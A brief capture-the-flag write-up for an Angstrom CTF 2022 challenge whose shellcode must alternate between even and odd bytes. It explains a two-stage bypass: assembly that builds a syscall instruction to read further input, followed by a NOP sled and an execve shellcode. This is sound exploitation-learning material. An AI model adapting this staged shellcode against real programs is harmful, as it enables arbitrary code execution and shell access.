# CHALL 3
- From Angstrom CTF 2022.
- Shellcode restriction: It must alternate between even and odd bytes.
- Solution: Call `SYS_read()` on the shellcode buffer (`rax` and `rsi` are holding the shellcode's address when it executes), then pass in a NOP sled + unrestricted execve shellcode instead of calling `SYS_execve()` directly.
- Shellcode to call `SYS_read()`:
```
mov rdx, rax;
pop rbx;
mov cx, 0x50e;
mov rdx, rcx;
pop rbx;
inc rdx;
pop rbx;
mov [rsi], rdx;
jmp rsi
```
